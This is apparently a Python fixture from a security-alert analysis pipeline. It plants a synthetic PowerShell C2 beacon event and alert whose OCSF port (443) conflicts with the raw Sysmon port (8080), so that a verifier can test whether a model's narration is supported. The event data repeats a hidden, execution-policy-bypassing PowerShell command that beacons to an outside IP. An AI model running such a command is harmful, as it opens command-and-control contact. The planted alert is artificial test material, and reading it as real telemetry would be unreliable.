"""Pipeline fixtures, including the planted false alert (Step 5.1 & system_design.md §10.3)."""

from __future__ import annotations

import json
import logging
from typing import Any

from sqlalchemy import text
from sqlalchemy.orm import Session

from curator.config import settings

logger = logging.getLogger(__name__)

PLANTED_ALERT_EVENT_ID = 999999
PLANTED_IP = "198.51.100.66"
PLANTED_RULE_ID = "CUR-003"
PLANTED_RULE_NAME = "C2 Network Connection over HTTPS"
PLANTED_SEVERITY = "critical"
PLANTED_TECHNIQUE_IDS = ["T1071.001"]
PLANTED_HOST = "SCRANTON"
PLANTED_USER = "pbeesly"
PLANTED_TS = "2020-05-02 03:07:30.000000+00:00"


def inject_planted_alert(session: Session) -> dict[str, Any] | None:
    """Inject a synthetic telemetry event with an internal port conflict (Option 3).

    The synthetic event (999999) represents an outbound PowerShell beacon to 198.51.100.66.
    The OCSF mapping and command line specify port 443 (HTTPS), while the underlying raw
    Sysmon record logs DestinationPort 8080.
    The model narrates the outbound connection to port 443; the verifier catches the
    conflict against the raw telemetry and flags the claim unsupported.
    """
    if not settings.plant_false_alert:
        logger.info("PLANT_FALSE_ALERT is disabled; skipping planted alert injection")
        return None

    # Find the target incident on SCRANTON (Day 1 pbeesly campaign, #402)
    q_inc = text("""
        SELECT id FROM incidents
        WHERE 'SCRANTON' = ANY(hosts) AND 'pbeesly' = ANY(users)
        ORDER BY priority DESC, id ASC
        LIMIT 1
    """)
    inc_row = session.execute(q_inc).fetchone()
    target_incident_id = inc_row[0] if inc_row else 402

    # Check if already injected with the new synthetic event
    q_check = text("SELECT id, incident_id FROM alerts WHERE is_planted = true AND event_id = :eid LIMIT 1")
    existing = session.execute(q_check, {"eid": PLANTED_ALERT_EVENT_ID}).fetchone()
    if existing:
        logger.info("Planted synthetic alert already present: alert_id=%d in incident_id=%s", existing[0], existing[1])
        return {"alert_id": existing[0], "incident_id": existing[1], "already_existed": True}

    # Clean up any legacy planted alerts (e.g. 42145)
    session.execute(text("DELETE FROM alerts WHERE is_planted = true"))
    session.execute(text("DELETE FROM events WHERE is_planted = true OR id = :eid"), {"eid": PLANTED_ALERT_EVENT_ID})

    # 1. Insert synthetic event 999999 with OCSF vs Raw port conflict
    ocsf_payload = {
        "class_uid": 4001,
        "class_name": "Network Activity",
        "type_uid": 400101,
        "activity_id": 1,
        "activity_name": "Open",
        "time": 1588388850000,
        "time_dt": "2020-05-02T03:07:30.000000Z",
        "device": {"hostname": "SCRANTON.dmevals.local"},
        "actor": {
            "process": {
                "name": "powershell.exe",
                "file": {
                    "name": "powershell.exe",
                    "path": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
                },
                "cmd_line": f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-RestMethod -Uri https://{PLANTED_IP}:443/beacon\"",
            },
            "user": {"name": "pbeesly"},
        },
        "src_endpoint": {"ip": "10.0.1.4", "port": 49721},
        "dst_endpoint": {"ip": PLANTED_IP, "port": 443},
    }

    raw_payload = {
        "EventID": 3,
        "SourceName": "Microsoft-Windows-Sysmon",
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "UtcTime": "2020-05-02 03:07:30.000",
        "ProcessId": 2976,
        "Image": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-RestMethod -Uri https://{PLANTED_IP}:443/beacon\"",
        "User": "DMEVALS\\pbeesly",
        "SourceIp": "10.0.1.4",
        "SourcePort": 49721,
        "DestinationIp": PLANTED_IP,
        "DestinationPort": 8080,
        "DestinationPortName": "http-alt",
        "Protocol": "tcp",
        "Initiated": "true",
    }

    q_insert_event = text("""
        INSERT INTO events (
            id, ts, source, host, user_name, process_name, command_line,
            parent_process, event_code, src_ip, dst_ip, ocsf, raw, is_planted, incident_id
        ) VALUES (
            :id, :ts, :source, :host, :user_name, :process_name, :command_line,
            :parent_process, :event_code, :src_ip, :dst_ip, :ocsf, :raw, :is_planted, :incident_id
        )
    """)

    session.execute(
        q_insert_event,
        {
            "id": PLANTED_ALERT_EVENT_ID,
            "ts": PLANTED_TS,
            "source": "Microsoft-Windows-Sysmon",
            "host": "SCRANTON.dmevals.local",
            "user_name": PLANTED_USER,
            "process_name": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-RestMethod -Uri https://{PLANTED_IP}:443/beacon\"",
            "parent_process": "C:\\windows\\system32\\cmd.exe",
            "event_code": "3",
            "src_ip": "10.0.1.4",
            "dst_ip": PLANTED_IP,
            "ocsf": json.dumps(ocsf_payload),
            "raw": json.dumps(raw_payload),
            "is_planted": True,
            "incident_id": target_incident_id,
        },
    )

    # 2. Insert alert pointing to this synthetic event
    q_insert_alert = text("""
        INSERT INTO alerts (
            event_id, rule_id, rule_name, severity, technique_ids,
            ts, host, user_norm, process_uid, is_planted, detail, incident_id
        ) VALUES (
            :event_id, :rule_id, :rule_name, :severity, :technique_ids,
            :ts, :host, :user_norm, :process_uid, :is_planted, :detail, :incident_id
        ) RETURNING id
    """)

    alert_id = session.execute(
        q_insert_alert,
        {
            "event_id": PLANTED_ALERT_EVENT_ID,
            "rule_id": PLANTED_RULE_ID,
            "rule_name": PLANTED_RULE_NAME,
            "severity": PLANTED_SEVERITY,
            "technique_ids": PLANTED_TECHNIQUE_IDS,
            "ts": PLANTED_TS,
            "host": PLANTED_HOST,
            "user_norm": PLANTED_USER,
            "process_uid": f"proc_{PLANTED_ALERT_EVENT_ID}",
            "is_planted": True,
            "detail": json.dumps({"planted": True, "note": "Step 5b demo false alert - port conflict"}),
            "incident_id": target_incident_id,
        },
    ).scalar_one()

    session.commit()
    logger.info(
        "Injected planted synthetic event %d and alert %d into incident #%d (port conflict demo)",
        PLANTED_ALERT_EVENT_ID,
        alert_id,
        target_incident_id,
    )

    return {
        "alert_id": alert_id,
        "event_id": PLANTED_ALERT_EVENT_ID,
        "incident_id": target_incident_id,
        "rule_id": PLANTED_RULE_ID,
        "is_planted": True,
    }
